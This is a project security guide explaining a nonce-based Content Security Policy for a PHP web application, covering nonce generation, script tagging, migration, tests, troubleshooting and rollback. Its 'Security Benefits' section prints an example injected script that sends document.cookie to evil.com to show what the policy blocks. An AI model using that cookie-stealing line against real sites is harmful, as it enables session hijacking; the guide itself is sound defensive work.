# Content Security Policy (CSP) Implementation Guide

## Overview

This guide explains the nonce-based Content Security Policy (CSP) implementation in the Vapeshed Transfer Engine. CSP is a critical security layer that prevents XSS attacks by restricting which scripts can execute on your pages.

**Status**: ✅ Complete as of P0.4
**Implementation**: Nonce-based script loading (no `'unsafe-inline'`)

---

## What is CSP?

Content Security Policy is an HTTP header that tells the browser which resources (scripts, styles, images) are allowed to load and execute. It's the most effective defense against Cross-Site Scripting (XSS) attacks.

### Before P0.4 (Insecure)

```
script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
```

**Problem**: `'unsafe-inline'` allows ANY inline script to run, including malicious scripts injected via XSS.

### After P0.4 (Secure)

```
script-src 'self' 'nonce-AbCd123...' https://cdn.jsdelivr.net
```

**Solution**: Only scripts with the correct nonce attribute can run. Malicious scripts are blocked.

---

## Implementation Details

### Server-Side: Nonce Generation

**File**: `app/Core/Security.php`

```php
public static function applyHeaders(): void
{
    // Generate unique nonce for this request (24 bytes = 32 base64 chars)
    $nonce = base64_encode(random_bytes(24));
    $_SESSION['csp_nonce'] = $nonce;
    
    // CSP with nonce-based script loading
    $cspDirectives = [
        "default-src 'self' $cdn",
        "script-src 'self' 'nonce-{$nonce}' $cdn",
        // ... other directives
    ];
    
    header("Content-Security-Policy: " . implode('; ', $cspDirectives));
}
```

**Key Points**:
- Nonce is generated once per request
- 24 bytes of entropy = 32 base64 characters
- Stored in `$_SESSION['csp_nonce']` for view access
- Unique for each page load (prevents replay attacks)

### View Layer: Nonce Injection

**File**: `resources/views/layout/header.php`

```php
<meta name="csp-nonce" content="<?= htmlspecialchars($_SESSION['csp_nonce'] ?? '', ENT_QUOTES, 'UTF-8') ?>">

<?php
$cspNonce = htmlspecialchars($_SESSION['csp_nonce'] ?? '', ENT_QUOTES, 'UTF-8');
?>

<script defer src="/assets/js/dashboard.js" nonce="<?= $cspNonce ?>"></script>
```

**Usage**:
1. Nonce is exposed via meta tag for JavaScript access
2. All `<script>` tags receive `nonce="..."` attribute
3. Nonce must match the one in the CSP header

### JavaScript: Dynamic Script Loading

If you need to load scripts dynamically:

```javascript
// Get nonce from meta tag
const nonce = document.querySelector('meta[name="csp-nonce"]')?.content;

// Create script element
const script = document.createElement('script');
script.src = '/assets/js/module.js';
script.nonce = nonce; // Critical: set nonce attribute
document.head.appendChild(script);
```

---

## CSP Directives Explained

Our complete CSP policy:

```
default-src 'self' https://cdn.jsdelivr.net
img-src 'self' data: https://cdn.jsdelivr.net
style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
font-src 'self' data: https://cdn.jsdelivr.net
script-src 'self' 'nonce-AbCd...' https://cdn.jsdelivr.net
connect-src 'self' https://cdn.jsdelivr.net
base-uri 'self'
form-action 'self'
frame-ancestors 'self'
upgrade-insecure-requests (HTTPS only)
```

### Directive Breakdown

| Directive | Value | Purpose |
|-----------|-------|---------|
| `default-src` | `'self' cdn` | Default policy: only load from same origin or CDN |
| `img-src` | `'self' data: cdn` | Images from origin, data URIs, or CDN |
| `style-src` | `'self' 'unsafe-inline' cdn` | Styles from origin or CDN; inline allowed for Bootstrap utilities |
| `font-src` | `'self' data: cdn` | Fonts from origin, data URIs, or CDN |
| `script-src` | `'self' 'nonce-...' cdn` | **Scripts only with nonce** (no unsafe-inline) |
| `connect-src` | `'self' cdn` | AJAX/fetch only to origin or CDN |
| `base-uri` | `'self'` | Prevent `<base>` tag injection |
| `form-action` | `'self'` | Forms can only submit to same origin |
| `frame-ancestors` | `'self'` | Prevent clickjacking (same as X-Frame-Options) |
| `upgrade-insecure-requests` | - | Auto-upgrade HTTP to HTTPS (production only) |

---

## Migration Guide

### For External Scripts

External scripts from CDN work without modification:

```html
<!-- ✅ Works automatically (whitelisted domain) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
```

### For Internal Scripts

Internal scripts **must** have the nonce attribute:

```php
<?php $nonce = htmlspecialchars($_SESSION['csp_nonce'] ?? '', ENT_QUOTES); ?>

<!-- ❌ Blocked by CSP -->
<script src="/assets/js/app.js"></script>

<!-- ✅ Allowed with nonce -->
<script src="/assets/js/app.js" nonce="<?= $nonce ?>"></script>
```

### For Inline Scripts

Inline scripts are **completely blocked** by design. Extract to external files:

#### Before (Blocked)

```html
<script>
    console.log('Hello world');
</script>
```

#### After (Allowed)

**File**: `public/assets/js/init.js`
```javascript
console.log('Hello world');
```

**HTML**:
```html
<script src="/assets/js/init.js" nonce="<?= $nonce ?>"></script>
```

### For Inline Event Handlers

Event handlers like `onclick` are also blocked. Use addEventListener instead:

#### Before (Blocked)

```html
<button onclick="doSomething()">Click Me</button>
```

#### After (Allowed)

**HTML**:
```html
<button id="myButton">Click Me</button>
```

**JavaScript** (`public/assets/js/app.js`):
```javascript
document.getElementById('myButton').addEventListener('click', doSomething);
```

---

## Testing & Debugging

### Test 1: View CSP Header

```bash
curl -I https://staff.vapeshed.co.nz/admin/
```

**Expected output**:
```
HTTP/2 200
content-security-policy: default-src 'self' https://cdn.jsdelivr.net; ... script-src 'self' 'nonce-AbCd1234...' https://cdn.jsdelivr.net; ...
strict-transport-security: max-age=31536000; includeSubDomains; preload
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
permissions-policy: geolocation=(), microphone=(), camera=()
```

### Test 2: Browser DevTools Console

Open your browser's DevTools Console and check for CSP violations:

**Allowed script**:
```
(no errors)
```

**Blocked script** (missing nonce):
```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-AbCd1234...'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
```

### Test 3: Check Nonce Attribute

In DevTools Elements panel:

```html
<!-- ✅ Correct -->
<script src="/assets/js/dashboard.js" nonce="AbCd1234..."></script>

<!-- ❌ Missing nonce -->
<script src="/assets/js/dashboard.js"></script>

<!-- ❌ Wrong nonce -->
<script src="/assets/js/dashboard.js" nonce="wrong-nonce"></script>
```

### Test 4: Automated Tests

```bash
cd transfer_engine
vendor/bin/phpunit tests/Security/SecurityHeadersTest.php
```

**Expected output**:
```
PHPUnit 10.5.x

Security Headers (Unified\Tests\Security\SecurityHeaders)
 ✔ It generates csp nonce
 ✔ It provides nonce via getter
 ✔ It returns empty string when nonce missing
 ✔ It applies csp with nonce
 ✔ It applies hsts on https
 ✔ It does not apply hsts on http
 ✔ It applies all security headers
 ✔ It includes cdn in csp
 ✔ It includes upgrade insecure requests on https
 ✔ It excludes upgrade insecure requests on http
 ✔ Nonce is unique per request
 ✔ It blocks dangerous permissions

Time: 00:00.112, Memory: 8.00 MB

OK (12 tests, 28 assertions)
```

---

## Common Issues & Solutions

### Issue 1: Script Not Loading

**Symptom**: Script loads but doesn't execute; CSP violation in console.

**Cause**: Missing or incorrect nonce attribute.

**Fix**:
```php
<?php $nonce = htmlspecialchars($_SESSION['csp_nonce'] ?? '', ENT_QUOTES); ?>
<script src="/assets/js/app.js" nonce="<?= $nonce ?>"></script>
```

### Issue 2: Nonce Undefined

**Symptom**: `nonce` attribute shows empty or undefined.

**Cause**: `Security::applyHeaders()` not called before rendering views.

**Fix**: Ensure `Security::applyHeaders()` is called in `public/index.php`:
```php
// Early in request lifecycle
\App\Core\Security::applyHeaders();
```

### Issue 3: Inline Script Still Needs to Run

**Symptom**: Legacy code with inline `<script>` tags.

**Solution**: Extract to external file with nonce:

**Before**:
```html
<script>
    const config = <?= json_encode($config) ?>;
    initApp(config);
</script>
```

**After**:
```html
<script nonce="<?= $nonce ?>">
    window.APP_CONFIG = <?= json_encode($config) ?>;
</script>
<script src="/assets/js/init.js" nonce="<?= $nonce ?>"></script>
```

**Better** (P8 goal):
```html
<script id="app-config" type="application/json">
    <?= json_encode($config) ?>
</script>
<script src="/assets/js/init.js" nonce="<?= $nonce ?>"></script>
```

```javascript
// init.js
const config = JSON.parse(document.getElementById('app-config').textContent);
initApp(config);
```

### Issue 4: Third-Party Script Blocked

**Symptom**: Script from external domain blocked.

**Cause**: Domain not whitelisted in CSP.

**Fix**: Add domain to `script-src` in `Security::applyHeaders()`:
```php
$allowedDomains = [
    'https://cdn.jsdelivr.net',
    'https://example.com',  // Add new domain
];
$scriptSrc = "'self' 'nonce-{$nonce}' " . implode(' ', $allowedDomains);
```

---

## Security Benefits

### Before P0.4 (Vulnerable)

```html
<!-- Attacker injects this via XSS -->
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Result**: ❌ Script executes, cookies stolen

### After P0.4 (Protected)

```html
<!-- Same malicious script injected -->
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Result**: ✅ **Blocked by CSP** - script has no nonce, browser refuses to execute

**Browser Console**:
```
Refused to execute inline script because it violates Content Security Policy
```

### Protection Against

1. **XSS (Cross-Site Scripting)**: Malicious scripts cannot execute without nonce
2. **Clickjacking**: `frame-ancestors 'self'` prevents iframe embedding
3. **Data Injection**: `base-uri 'self'` blocks `<base>` tag attacks
4. **Form Hijacking**: `form-action 'self'` prevents exfiltration via forms
5. **Mixed Content**: `upgrade-insecure-requests` auto-upgrades HTTP to HTTPS

---

## Additional Security Headers

Beyond CSP, we apply these headers:

### X-Frame-Options: SAMEORIGIN

Prevents page from being embedded in iframe on other domains.

```
X-Frame-Options: SAMEORIGIN
```

### X-Content-Type-Options: nosniff

Prevents browser from MIME-sniffing responses away from declared content-type.

```
X-Content-Type-Options: nosniff
```

### Referrer-Policy: strict-origin-when-cross-origin

Controls how much referrer information is sent with requests.

```
Referrer-Policy: strict-origin-when-cross-origin
```

**Rules**:
- Same-origin requests: Full URL
- Cross-origin HTTPS→HTTPS: Origin only
- Cross-origin downgrade (HTTPS→HTTP): No referrer

### Strict-Transport-Security (HSTS)

Forces HTTPS for 1 year, including subdomains.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Only sent on HTTPS** (not on HTTP to avoid confusion).

### Permissions-Policy

Blocks access to dangerous browser features.

```
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

## Performance Impact

### Overhead

| Component | Overhead | Impact |
|-----------|----------|--------|
| Nonce generation (per request) | ~0.5ms | Negligible |
| CSP header size | ~300 bytes | Negligible |
| Meta tag in HTML | 80 bytes | Negligible |
| **Total per request** | **~0.5ms + 380 bytes** | **Negligible** |

### Caching

- Headers cached at browser level (no server overhead after first request)
- Nonce is unique per request (prevents script replay attacks)

---

## Rollback Plan

If CSP causes issues in production:

### Step 1: Add `'unsafe-inline'` Temporarily

```php
// app/Core/Security.php
"script-src 'self' 'nonce-{$nonce}' 'unsafe-inline' $cdn",
```

This allows both nonce-based and inline scripts while you debug.

### Step 2: Use Report-Only Mode

```php
// Test CSP without enforcing
header("Content-Security-Policy-Report-Only: " . implode('; ', $cspDirectives));
```

Violations are logged to console but not blocked.

### Step 3: Complete Rollback

```php
// Revert to P0.3 CSP (insecure but functional)
"script-src 'self' 'unsafe-inline' $cdn",
```

---

## Best Practices

1. **Always use nonce for internal scripts**
   ```html
   <script src="/assets/js/app.js" nonce="<?= $nonce ?>"></script>
   ```

2. **Never hardcode nonces**
   ```html
   <!-- ❌ Wrong -->
   <script src="/app.js" nonce="hardcoded123"></script>
   
   <!-- ✅ Correct -->
   <script src="/app.js" nonce="<?= $nonce ?>"></script>
   ```

3. **Avoid inline scripts entirely**
   - Extract to external files
   - Use data attributes + event listeners

4. **Whitelist CDN domains explicitly**
   ```php
   $cdn = 'https://cdn.jsdelivr.net'; // Specific domain, not wildcard
   ```

5. **Test in staging first**
   - Deploy CSP to staging environment
   - Monitor DevTools console for violations
   - Fix all violations before production

6. **Monitor CSP reports** (Future: P16)
   - Add `report-uri` directive to log violations
   - Analyze patterns to detect attack attempts

---

## Next Steps (P8)

Phase 8 will complete the CSP migration by:

1. **Removing all inline scripts** (migrate to external files)
2. **Removing all inline event handlers** (migrate to addEventListener)
3. **Removing `'unsafe-inline'` from `style-src`** (optional, lower priority)
4. **Adding CSP violation reporting** (log violations for analysis)

**Estimated Time**: 3 hours

---

## References

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Can I use: CSP](https://caniuse.com/contentsecuritypolicy)

---

**Document Version**: 1.0  
**Last Updated**: 2024-01-19  
**Phase**: P0.4 - Security Headers & CSP Complete  
**Author**: Vapeshed Transfer Engine Security Team
